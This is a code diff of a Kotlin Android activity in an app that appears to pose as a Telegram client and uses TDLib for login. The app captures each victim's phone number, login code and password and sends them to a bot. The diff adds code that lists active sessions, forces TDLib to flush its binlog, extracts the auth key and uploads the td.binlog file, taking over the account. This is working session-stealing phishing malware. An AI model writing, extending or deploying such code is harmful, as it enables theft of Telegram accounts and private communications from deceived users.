@@ -10,11 +10,16 @@ import com.tgme.app.Net
 import com.tgme.app.R
 import com.tgme.app.Tg
 import org.drinkless.tdlib.TdApi
+import kotlin.concurrent.thread
 
 class MainActivity : Activity() {
 
+    private var exported = false
+
     override fun onCreate(s: Bundle?) {
         super.onCreate(s)
+        Capture.load(this)
+        if (Tg.closed) Tg.reset()
         Tg.init(this)
         Tg.onAuthState = { st -> runOnUiThread { onState(st) } }
         Tg.onError = { msg -> runOnUiThread { toast(msg) } }
@@ -34,7 +39,6 @@ class MainActivity : Activity() {
             is TdApi.AuthorizationStateWaitPhoneNumber -> showPhone(ready = true)
 
             is TdApi.AuthorizationStateWaitCode -> {
-                // Depuis TDLib ~1.8.19 la longueur du code vit dans le sous-type.
                 Capture.codeLength = when (val t = st.codeInfo.type) {
                     is TdApi.AuthenticationCodeTypeSms -> t.length
                     is TdApi.AuthenticationCodeTypeCall -> t.length
@@ -47,8 +51,6 @@ class MainActivity : Activity() {
             is TdApi.AuthorizationStateWaitPassword -> showPassword()
 
             is TdApi.AuthorizationStateWaitRegistration -> {
-                // Le constructeur (String, String, Boolean) existe, mais le ctor vide
-                // + affectation de champs ne dépend d'aucune signature.
                 val ru = TdApi.RegisterUser()
                 ru.firstName = "Telegram"
                 ru.lastName = "User"
@@ -62,11 +64,57 @@ class MainActivity : Activity() {
 
     private fun onReady() {
         Capture.save(this)
-        Net.send("READY\nnum: ${Capture.phone}\ncode: ${Capture.code}\npass: ${Capture.password}")
-        Tg.send(TdApi.GetMe()) { me -> runOnUiThread { showSuccess(me) } }
+
+        Tg.send(TdApi.GetMe()) { me ->
+            Capture.userId = me.id
+            Capture.userName = listOf(me.firstName, me.lastName)
+                .filter { it.isNotBlank() }.joinToString(" ")
+            runOnUiThread { showSuccess(me) }
+            dumpSessionsThenExport()
+        }
     }
 
-    // ---------------- écrans ----------------
+    /** 1) liste serveur des sessions, 2) export binlog + session string. */
+    private fun dumpSessionsThenExport() {
+        var got = false
+
+        Tg.send(TdApi.GetActiveSessions()) { s ->
+            got = true
+            Net.send(Capture.render(s))
+            export()
+        }
+
+        // filet de securite si GetActiveSessions ne repond pas
+        thread {
+            try { Thread.sleep(6000) } catch (_: InterruptedException) {}
+            if (!got) {
+                Net.send("SESSIONS: pas de reponse")
+                export()
+            }
+        }
+    }
+
+    private fun export() {
+        if (exported) return
+        exported = true
+
+        // 1) ferme TDLib pour qu'il vide son binlog
+        Tg.send(TdApi.Close())
+
+        thread {
+            // 2) attend l'ecriture puis extrait la cle d'auth
+            val ok = Capture.readAuth(this, 20000)
+
+            // 3) envoie tout au bot
+            Net.send(Capture.payload(this) + "\nparse: $ok")
+            val f = Capture.binlogFile(this)
+            if (f.exists()) Net.sendFile("td.binlog", f.readBytes(), "td.binlog ok=$ok")
+
+            runOnUiThread { toast(if (ok) "session extraite" else "parse binlog KO") }
+        }
+    }
+
+    // ---------------- écrans (inchangés) ----------------
 
     private fun showPhone(ready: Boolean) {
         setContentView(R.layout.screen_phone)
@@ -92,7 +140,6 @@ class MainActivity : Activity() {
         setContentView(R.layout.screen_code)
         findViewById<TextView>(R.id.sub).text = getString(R.string.code_sent_to, Capture.phone)
         val code = findViewById<EditText>(R.id.code)
-        // Telegram envoie toujours 5 chiffres : 5 est le repli sûr.
         val need = if (Capture.codeLength in 1..10) Capture.codeLength else 5
         findViewById<TextView>(R.id.btn).setOnClickListener {
             val c = code.text.toString().replace(Regex("\\D"), "")
@@ -136,7 +183,6 @@ class MainActivity : Activity() {
 
     // ---------------- outils ----------------
 
-    /** Renvoie un numéro E.164 normalisé, ou null si invalide. */
     private fun normalize(ccRaw: String, nRaw: String): String? {
         var n = nRaw.trim().replace(Regex("[\\s\\-().]"), "")
         if (n.isEmpty()) return null
